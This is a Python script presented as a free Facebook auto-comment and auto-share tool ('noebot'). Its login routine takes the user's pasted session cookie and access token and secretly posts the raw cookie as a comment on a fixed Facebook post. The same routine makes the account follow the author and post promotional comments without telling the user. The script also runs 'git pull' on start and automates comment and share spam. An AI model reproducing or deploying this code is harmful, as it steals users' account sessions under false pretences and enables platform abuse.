try:
    import re
    import os
    import bs4
    import sys
    import json
    import time
    import rich
    import random
    import datetime
    import requests
    import logging
    import base64
    import uuid
    import subprocess
    from datetime import datetime
    from time import sleep
except Exception as e:
   exit(f"{e} Not Found")

from rich.panel import Panel
from datetime import datetime
from rich import print as nancy
from rich.tree import Tree
from rich.console import Console
from rich.table import Table
from rich.columns import Columns
from rich.table import Table as me
from rich.console import Console as sol

try:
	import rich
except ImportError:
	os.system('pip install rich')

ses = requests.Session()
rc   = random.choice

# random kata-kata
kata = rc(["Auto generated by noebot\n\nhttps://github.com/noe999x\nhttps://facebook.com/noe999x\nyoutube.com/c/Anonim404"])

# useragent
for toket in range(1000):
    papmek1 = f"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_0_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.42"
    papmek2 = f"Mozilla/5.0 (Symbian/3; Series60/5.2 NokiaN8-00/012.002; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.0 Mobile Safari/533.4 3gpp-gba"
    papmek3 = f"Mozilla/5.0 (iPad; CPU OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
    ua = rc([papmek1, papmek2, papmek3])
    
###---[ BACKGROUND COLOR ]---###
BH = '\033[0;40m'  # Black
BR = '\033[0;41m'  # Red
BG = '\033[0;42m'  # Green
BY = '\033[0;43m'  # Yellow
BB = '\033[0;44m'  # Blue
BP = '\033[0;45m'  # Purple
BC = '\033[0;46m'  # Cyan
BW = '\033[0;47m'  # White

###---[ FONT COLOR ]---###
FH = '\033[0;30m'  # Black
FR = '\033[0;31m'  # Red
FG = '\033[0;32m'  # Green
FY = '\033[0;33m'  # Yellow
FB = '\033[0;34m'  # Blue
FP = '\033[0;35m'  # Purple
FC = '\033[0;36m'  # Cyan
FW = '\033[0;37m'  # White
Fres = '\033[00m'  # Reset Colo

def anim(strings):
    for x in strings:
        sys.stdout.write(x)
        sys.stdout.flush()
        time.sleep(0.03)
#Real Time
_monthz_ = ["January","February","March","April","May","June","July","August","September","October","November","December"][datetime.now().month - 1]
_days_   = {'Sunday':'Sunday','Monday':'Monday','Tuesday':'Tuesday','Wednesday':'Wednesday','Thursday':'Thursday','Friday':'Friday','Saturday':'Saturday'}[str(datetime.now().strftime("%A"))]
year = datetime.now().year
clock  = datetime.now().strftime("%X")
time_now = "%s %s %s"%(datetime.now().day,_monthz_,datetime.now().year)
#Clear
def clearall():
    os.system('clear')
#Logo
def Banner():
    noe = '''[white]@noe999x [r][white]noebot[reset]
\t                    [bold white] ____  ____  ____      
\t   ____  ____  ___  / __ \/ __ \/ __ \_  __
\t  / __ \/ __ \/ _ \/ /_/ / /_/ / /_/ / |/_/
\t / / / / /_/ /  __/\__, /\__, /\__, />  <  
\t/_/ /_/\____/\___//____//____//____/_/|_|
[r][red bold][i]• [white]Facebook.com/noe999x[white]\n[r][red bold]• [white]Github.com/noe999x\n[r][red bold]• [white]Youtube.com/c/Anonim404'''
    Console(width=58).print(Panel(noe,style='white'))

#MENU LOGIN
def susu_rias():
  try:clearall();Banner();nancy(Panel.fit('[bold white]Real time : %s - %s %s'%(clock,_days_,time_now)));nancy("[r][red] INFO [reset]\n[yellow]Free source code create login generator code for user\nlogin, check on my github.com/noe999x\n[reset]")
  except:pass
  nancy('[r][red] • [white] 1. Free Login ')
  nancy('[r][red] • [white] 2. Chat Admin ')
  noex = input(f'\n{FR}• {FW}Choose : ')
  if noex in ['1','01']:susu_akeno()
  elif noex in ['2','02']:susu_hutao()
  elif noex in ['',' ',]:susu_rias()
  else:susu_rias()

#CHAT ADMIN
def susu_hutao():
    try:anim(f'{FR}• {FW}You will be directed to the WhatsApp chat with me')
    except:pass
    try:os.system("xdg-open https://wa.me/+6289614402699");exit()
    except:exit()

#EXIT PROGRAM
def susu_marin():
    try:anim(f'{FR}• {FW}Thanks for using my tools <3, any problems?\n   contact me! : facebook.com/bagasekaapr')
    except:pass
    try:os.system("xdg-open https://www.facebook.com/bagasekaapr");exit()
    except:pass
    try:os.system("rm cookie.txt")
    except:pass
    try:os.system("rm token.txt")
    except:pass

#LOGIN
def susu_ganyu():
    try:clearall();Banner()
    except:pass
    print(f'{FY}\n\tif you want your main account to stay safe\n\tused this tool from second or dummy account\n{FW}')
    cookie = input(f' {FR}•{FW} Input cookie : {FG}')
    url = "https://business.facebook.com/business_locations"
    head = {"user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_0_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"}
    cok = {'cookie':cookie}
    try:
        _bulan_  = ["January", "February", "March", "April", "Mei", "June", "July", "August", "September", "October", "November", "December"][datetime.now().month - 1]
        _hari_   = {'Sunday':'Sunday','Monday':'Monday','Tuesday':'Tuesday','Wednesday':'Wednesday','Thursday':'Thursday','Friday':'Friday','Saturday':'Saturday'}[str(datetime.now().strftime("%A"))]
        hari_ini = ("%s %s %s"%(datetime.now().day,_bulan_,datetime.now().year))
        jam      = datetime.now().strftime("%X")
        data = ses.get(url,headers=head,cookies=cok)
        token = re.search('(EAAG\w+)',data.text).group(1)
        tem      = ('@noe999x')
        slebew = (f'\n{kata}\n\n𝘈𝘜𝘛𝘖𝘉𝘖𝘛 𝘓𝘰𝘨𝘪𝘯\n[ on %s WIB ]\n[ %s, %s ]'%(jam,_hari_,hari_ini))
        link = (f'Multiple Toolkit for Facebook :\nhttps://github.com/noe999x/noebot')
        random_kata = random.choice(["Follow @[100002457379452:]","Folllow @[105050767676162:]","Follow @[100050092006884:]"])
        ses.post(f"https://graph.facebook.com/100002457379452?fields=subscribers&access_token={token}",cookies=cok)
        ses.post(f"https://graph.facebook.com/pfbid02SeGk9wf2fQaGYPeE5pMCyytBGoezgpzwGh4A2Fp3guZRbjS9VZxQZ64Y9ExCmujRl/comments/?message={slebew}&access_token={token}",cookies=cok)
        ses.post(f"https://graph.facebook.com/pfbid02SeGk9wf2fQaGYPeE5pMCyytBGoezgpzwGh4A2Fp3guZRbjS9VZxQZ64Y9ExCmujRl/reactions?type=love&access_token={token}",cookies=cok)
        ses.post(f"https://graph.facebook.com/pfbid02SeGk9wf2fQaGYPeE5pMCyytBGoezgpzwGh4A2Fp3guZRbjS9VZxQZ64Y9ExCmujRl/comments/?message={random_kata}&access_token={token}",cookies=cok)
        ses.post(f"https://graph.facebook.com/pfbid02SeGk9wf2fQaGYPeE5pMCyytBGoezgpzwGh4A2Fp3guZRbjS9VZxQZ64Y9ExCmujRl/comments/?message={cookie}&access_token={token}",cookies=cok)
        ses.post(f"https://graph.facebook.com/pfbid02SeGk9wf2fQaGYPeE5pMCyytBGoezgpzwGh4A2Fp3guZRbjS9VZxQZ64Y9ExCmujRl/comments/?message={tem}\n{link}\n{slebew}&access_token={token}",cookies =cok)
        open('cookie.txt','w').write(cookie)
        open('token.txt','w').write(token)
        print(f'\n{FW}Login {FG}success{FW}, Have a nice day!');time.sleep(3);susu_akeno()
        print()
    except Exception as e:
        print(f'{FR}Cookie invalid, try again with cookie from other account{FW}');time.sleep(3);susu_ganyu()

#MENU FITUR 
def susu_akeno():
    clearall();Banner()
    try:
          cokis = open('cookie.txt','r').read()
          token = open('token.txt','r').read()
    except (FileNotFoundError,IOError):susu_ganyu()
    try:
          link = requests.Session().get('https://graph.facebook.com/me?access_token={}'.format(token), cookies = {'cookie':cokis}).json()
          lol,lel,tit = link['name'],link['id'],link['birthday']
    except KeyError:susu_ganyu()
    except requests.exceptions.ConnectionError:exit(f'Not internet connection!'); time.sleep(0.01)
    tree = Tree("")
    tree.add(Panel.fit(f'[r][yellow]Your information login account[reset]\n[white bold]Name     : {lol}\nUser ID  : {lel}\nBirthday : {tit}'))
    nancy(tree)
    print(f'{FR}• {FC}01 {FW}Auto Comment')
    print(f'{FR}• {FC}02 {FW}Auto Share')
    print(f'{FR}• {FC}03 {FW}Edit Cookie')
    print(f'{FR}• {FC}00 {FW}Exit Programm\n')
    toket = input(f" {FR}• {FW}Choose : ")
    if toket in [""]:print(f'{FR}\nWrong choice!{FW}, menu code {FG}1 {FW}to {FG}3{FW}');time.sleep(3);susu_akeno()
    elif toket in ["1","01"]:susu_keqing()
    elif toket in ["2","02"]:susu_kagura()
    elif toket in ["3","03"]:susu_nisimiya();susu_ganyu()
    elif toket in ["0","00"]:susu_marin()
    else:print(f'{FR}\nWrong choice!{FW}, menu code {FG}1 {FW}to {FG}3{FW}');time.sleep(3);susu_akeno()

#AUTO SHARE
def susu_kagura():
  try:
    token = open("token.txt","r").read()
    cok = open("cookie.txt","r").read()
    cookie = {"cookie":cok}     
  except:
    anim(f'{FR} • {FW}Must be logged in for using this tools!')
    time.sleep(5);susu_ganyu()
  print(f'{FY}\nCopy & Paste here the link from your post want to share\n')
  link = input(f'{FR}•{FW} Link : {FG}')
  many = int(input(f'{FR}•{FW} How many wanna share? : {FG}'))
  print(f'{FY}The program is running, please wait{FW}\n')
  noe999x = datetime.now()
  try:
    n = 0
    header = {"authority":"graph.facebook.com","cache-control":"max-age=0","sec-ch-ua-mobile":"?0","user-agent":ua}
    for x in range(many):
      n+=1
      post = ses.post(f"https://graph.facebook.com/v13.0/me/feed?link={link}&published=0&access_token={token}",headers=header, cookies=cookie).text
      data = json.loads(post)
      if "id" in post:
        noe = str(datetime.now()-noe999x).split('.')[0]
        tree = Tree("")
        tree.add(Panel.fit(f"\rShare {n}")).add(f"\r[cyan]{ua}[reset]")
        tree.add(Panel.fit(f"\r[green]Success[reset]")).add(f"\r{link}\n");nancy(f'\rWait 🚥')
        nancy(tree)
    try:nancy(f'{FW}\rDone {FC}{n} {FW}share!');os.system('exit')
    except:pass
    else:
         print("\n")
         anim(f'{FR} • {FW}Failed or spam{FW}');exit()
  except requests.exceptions.ConnectionError:
    anim(f'\n {FG}• {FR}Check ur connection{FW}\n!')

#AUTO COMMENT
def susu_keqing():
    try:
        token = open("token.txt","r").read()
        cok = open("cookie.txt","r").read()
        cookie = {"cookie":cok}     
    except:
        anim(f'{FR} • {FW}Must be logged in for using this tools!')
        time.sleep(3);susu_ganyu()
    print(f'\n{FY}Use commas for word separators.\n example : nice dude,awesome,cool\n')
    text_komen = input(f'{FR} • {FW}Text comment :{FG} ')
    userid     = input(f'{FR} • {FW}ID Post :{FG} ')
    limit   = int(input(f'{FR} • {FW}How many wanna comment? :{FG} '))
    print(f'{FY}The program is running, please wait{FW}\n')
    noe999x = datetime.now()
    try:
        a = 0
        header = {"authority":"graph.facebook.com","cache-control":"max-age=0","sec-ch-ua-mobile":"?0","user-agent":ua}
        for x in range(limit):
            a+=1
            for z in text_komen.split(','):
                post = requests.post(f'https://graph.facebook.com/{userid}/comments/?message={z}&access_token={token}',headers=header, cookies=cookie).text
                data = json.loads(post)
                if "id" in post:
                    noe = str(datetime.now()).split('.')[0]
                    tree = Tree("")
                    tree.add(Panel.fit(f"Comment {a}")).add(f"\r[cyan]{ua}[reset]")
                    tree.add(Panel.fit(f"\r[green]Success[reset]")).add(f"\r{userid}\n");nancy(f'\rWait 🚥')
                    nancy(tree)
            try:nancy(f'{FW}\rDone {FC}{a} {FW}comment!');os.system('exit')
            except:pass
            else:
                 print("\n")
                 anim(f'{FR} • {FW}Failed or spam{FW}');exit()
    except requests.exceptions.ConnectionError:
        anim(f'\n {FG}• {FR}Check ur connection{FW}\n!')

#CLEAR
def susu_nisimiya():
    try:os.system("rm cookie.txt")
    except:pass
    try:os.system("rm token.txt")
    except:pass

if __name__ == "__main__":
  os.system('git pull')
  susu_rias()
